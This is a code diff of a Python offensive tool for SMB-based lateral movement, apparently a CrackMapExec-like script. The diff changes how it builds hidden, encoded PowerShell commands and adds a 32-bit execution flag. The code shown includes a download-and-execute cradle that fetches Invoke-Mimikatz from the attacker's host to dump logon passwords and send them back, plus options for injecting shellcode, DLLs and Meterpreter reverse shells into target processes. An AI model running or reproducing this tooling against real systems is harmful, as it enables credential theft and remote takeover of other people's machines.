@@ -2642,6 +2642,7 @@ def _listShares(smb):
     return permissions
 
 def ps_command(command=None, katz_ip=None, katz_command='privilege::debug sekurlsa::logonpasswords exit'):
+
     if katz_ip:
         command = """
         IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-Mimikatz.ps1');
@@ -2657,7 +2658,14 @@ def ps_command(command=None, katz_ip=None, katz_command='privilege::debug sekurl
         $request.GetResponse();
         """.format(addr=katz_ip, katz_command=katz_command)
 
-    return b64encode(command.encode('UTF-16LE'))
+    if args.force_ps32:
+        command = 'IEX "$Env:windir\\SysWOW64\WindowsPowershell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}"'.format(b64encode(command.encode('UTF-16LE')))
+
+    base64_command = b64encode(command.encode('UTF-16LE'))
+
+    ps_command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64_command)
+
+    return ps_command
 
 def inject_pscommand(localip):
 
@@ -2865,18 +2873,18 @@ def connect(host):
 
             if args.mimikatz:
                 noOutput = True
-                args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(katz_ip=local_ip))
+                args.command = ps_command(katz_ip=local_ip)
 
             if args.mimi_cmd:
                 noOutput = True
-                args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(katz_ip=local_ip, katz_command=args.mimi_cmd))
+                args.command = ps_command(katz_ip=local_ip, katz_command=args.mimi_cmd)
 
             if args.pscommand:
-                args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(command=args.pscommand))
+                args.command = ps_command(command=args.pscommand)
 
             if args.inject:
                 noOutput = True
-                args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(inject_pscommand(local_ip))
+                args.command = inject_pscommand(local_ip)
 
             if args.command:
 
@@ -3006,12 +3014,13 @@ if __name__ == '__main__':
 
     cgroup = parser.add_argument_group("Command Execution", "Options for executing commands")
     cgroup.add_argument('--execm', choices={"wmi", "smbexec", "atexec"}, default="smbexec", help="Method to execute the command (default: smbexec)")
+    cgroup.add_argument('--force-ps32', action='store_true', dest='force_ps32', help='Force all PowerShell code/commands to run in a 32bit process')
     cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
     cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')
 
     xgroup = parser.add_argument_group("Shellcode/EXE/DLL/Meterpreter Injection", "Options for injecting Shellcode/EXE/DLL/Meterpreter in memory using PowerShell")
     xgroup.add_argument("--inject", choices={'shellcode', 'exe', 'dll', 'met_reverse_https', 'met_reverse_http'}, help='Inject Shellcode, EXE, DLL or Meterpreter')
-    xgroup.add_argument("--path", type=str, help='Path to the Shellcode/EXE/DLL you want to inject on the target systems')
+    xgroup.add_argument("--path", type=str, help='Path to the Shellcode/EXE/DLL you want to inject on the target systems (ignored if injecting Meterpreter)')
     xgroup.add_argument('--procid', type=int, help='Process ID to inject the Shellcode/EXE/DLL/Meterpreter into (if omitted, will inject within the running PowerShell process)')
     xgroup.add_argument("--exeargs", type=str, help='Arguments to pass to the EXE being reflectively loaded (ignored if not injecting an EXE)')
     xgroup.add_argument("--met-options", nargs=2, metavar=('LHOST', 'LPORT'), dest='met_options', help='Meterpreter options (ignored if not injecting Meterpreter)')
